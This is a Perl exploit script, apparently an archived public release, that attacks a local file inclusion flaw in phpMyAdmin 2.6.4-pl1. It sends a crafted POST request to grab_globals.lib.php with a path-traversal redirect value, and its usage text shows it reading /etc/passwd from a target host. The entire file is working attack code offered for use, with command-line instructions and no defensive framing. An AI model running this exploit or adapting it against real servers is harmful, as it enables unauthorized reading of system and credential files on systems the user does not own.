#!/usr/bin/perl
use IO::Socket;

# SecurityReason.com TEAM
# Maksymilian Arciemowicz ( cXIb8O3 ) cxib@securtiyreason.com
#
# Local file inclusion (./$FILE)
# simple exploit phpMyAdmin 2.6.4-pl1
#
#
# SecurityReason.com

if (@ARGV < 3)
{
print "\r\n SecurityReason TEAM\r\n";
print "[cXIb8O3] EXPLOIT for phpMyAdmin 2.6.4-pl1\r\n";
print " \r\n";
print "perl phpmyadmin-2.6.4-pl1.pl HOST /DIR/ FILE\r\n\r\n";
print "HOST - Host where is phpmyadmin example: http://localhost\r\n";
print "DIR - Directory to PMA example: /phpMyAdmin-2.6.4-pl1/\r\n";
print "FILE - file to inclusion ../../../../../etc/passwd\r\n\r\n";
print "example cmd: perl phpmyadmin-2.6.4-pl1.pl http://localhost /phpMyAdmin-2.6.4-pl1/ ../../../../../etc/passwd\r\n\r\n";
exit();
}

$HOST = $ARGV[0];
$DIR = $ARGV[1]."libraries/grab_globals.lib.php";
$FILE = "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=".$ARGV[2]."&subform[1][cXIb8O3]=1";
$LENGTH = length $FILE;

print "\r\nATTACK HOST IS: ".$HOST."\r\n\r\n";
$HOST =~ s/(http:\/\/)//;

$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "Error 404\r\n\r\n";

print $get1 "POST ".$DIR." HTTP/1.0\n";
print $get1 "Host: ".$HOST."\n";
print $get1 "Content-Type: application/x-www-form-urlencoded\n";
print $get1 "Content-Length: ".$LENGTH."\n\n";

print $get1 $FILE;

while ($odp = <$get1>)
{
if ($odp =~ /<b>Warning<\/b>: main\(\): Unable to access .\/$ARGV[2] in <b>/ ) {
printf "\n\nFile ".$ARGV[2]." no exists.\r\n\r\n";
exit;
}

printf $odp;
}

# milw0rm.com [2005-10-10]